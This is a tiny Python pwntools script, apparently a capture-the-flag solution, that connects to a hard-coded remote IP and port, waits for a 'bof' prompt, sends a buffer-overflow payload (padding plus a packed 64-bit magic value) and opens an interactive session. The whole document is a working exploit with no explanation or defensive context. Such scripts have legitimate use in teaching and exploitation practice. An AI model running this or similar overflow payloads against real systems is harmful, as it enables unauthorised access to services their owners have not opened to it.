from pwn import *
context.log_level='debug'
r=remote('220.249.52.133',40669)
r.recvuntil('bof')
payload='A'*0x4+p64(1853186401)
r.sendline(payload)
r.interactive()
